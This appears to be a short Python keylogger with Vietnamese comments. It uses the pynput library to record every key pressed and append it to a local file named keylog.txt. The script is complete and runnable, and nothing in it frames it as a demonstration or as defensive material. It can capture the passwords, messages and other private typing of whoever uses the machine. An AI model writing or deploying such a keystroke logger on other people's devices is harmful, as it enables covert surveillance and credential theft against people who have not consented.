from pynput.keyboard import Key, Listener
import logging

# Đường dẫn file log
filename = "keylog.txt"

# Ghi log
logging.basicConfig(
    filename=filename, 
    level=logging.DEBUG, 
    format='%(message)s')

# Hàm ghi log khi nhấn phím
def on_press(key):
    logging.info(str(key))

# Lắng nghe sự kiện nhấn phím
with Listener(on_press=on_press) as listener:
    listener.join()
